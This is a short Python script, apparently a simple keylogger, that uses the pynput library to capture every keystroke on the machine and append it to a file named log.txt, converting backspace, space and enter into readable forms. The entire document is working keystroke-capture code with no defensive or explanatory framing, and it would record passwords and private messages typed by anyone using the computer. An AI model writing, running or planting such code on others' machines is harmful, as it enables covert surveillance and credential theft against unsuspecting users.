from pynput.keyboard import Listener, Key  # Import Key for special keys like backspace

def writetofile(key):
    keydata = str(key).replace("'", "")  # Remove extra quotes around key name

    # Handle special keys
    if key == Key.backspace:
        keydata = "[BACKSPACE]"  # Or simply leave it blank: keydata = ''
    elif key == Key.space:
        keydata = " "  # Space character for readability
    elif key == Key.enter:
        keydata = "\n"  # Newline for enter key

    # Write key to log file
    with open("log.txt", "a") as f:
        f.write(keydata)

# Set up and start the listener for keyboard events
with Listener(on_press=writetofile) as l:
    l.join()  # Keeps the listener running
